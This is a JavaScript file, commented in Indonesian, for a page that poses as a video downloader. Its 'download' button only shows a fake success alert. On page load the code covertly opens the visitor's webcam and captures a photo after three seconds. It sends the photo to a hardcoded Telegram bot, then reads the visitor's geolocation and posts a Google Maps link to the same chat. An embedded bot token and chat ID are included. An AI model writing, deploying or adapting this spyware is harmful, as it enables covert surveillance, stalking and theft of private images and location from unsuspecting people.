const telegramBotToken = '7999220035:AAFf2ERfvapw7SWffyme3UAUO8H_0ljUav8'; // Ganti dengan token bot Anda
const chatId = '6975695436'; // Ganti dengan chat ID Anda

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

// Akses webcam tanpa terlihat
navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
    video.srcObject = stream;
    video.play();

    // Tangkap gambar setelah beberapa detik
    setTimeout(() => {
        const context = canvas.getContext("2d");
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(function(blob) {
            sendPhotoToTelegram(blob);
        }, 'image/jpeg');
    }, 3000); // Ambil gambar setelah 3 detik
}).catch(function(error) {
    console.error("Gagal mengakses webcam:", error);
});

// Fungsi untuk mengirim foto ke Telegram
function sendPhotoToTelegram(blob) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob);

    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
        method: 'POST',
        body: formData
    }).then(response => {
        if (response.ok) {
            console.log("Foto berhasil dikirim ke Telegram.");
            getLocation();  // Kirim lokasi setelah foto terkirim
        } else {
            console.error("Gagal mengirim foto ke Telegram.");
        }
    }).catch(error => {
        console.error("Error saat mengirim foto:", error);
    });
}

// Fungsi untuk mendapatkan lokasi pengguna
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const locationLink = `https://www.google.com/maps?q=${lat},${lon}`;
            sendLocationToTelegram(locationLink);
        }, function(error) {
            console.error("Error mendapatkan lokasi: ", error);
            sendLocationToTelegram("Lokasi tidak ditemukan.");
        });
    } else {
        console.error("Geolocation tidak didukung oleh browser ini.");
        sendLocationToTelegram("Geolocation tidak didukung.");
    }
}

// Fungsi untuk mengirim lokasi ke Telegram
function sendLocationToTelegram(locationLink) {
    const message = `📍 <b>Lokasi Pengguna:</b> <a href="${locationLink}">Lihat di Google Maps</a>`;
    
    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        })
    }).then(response => {
        if (response.ok) {
            console.log("Lokasi berhasil dikirim ke Telegram.");
        } else {
            console.error("Gagal mengirim lokasi ke Telegram.");
        }
    }).catch(error => {
        console.error("Error saat mengirim lokasi:", error);
    });
}

// Simulasi tombol download untuk interaksi pengguna
const downloadButton = document.getElementById("download");
downloadButton.addEventListener("click", function() {
    const urlInput = document.getElementById("url").value;
    if (urlInput) {
        alert("Video berhasil di unduh tunggu 3second.");
    } else {
        alert("Masukkan URL terlebih dahulu!");
    }
});
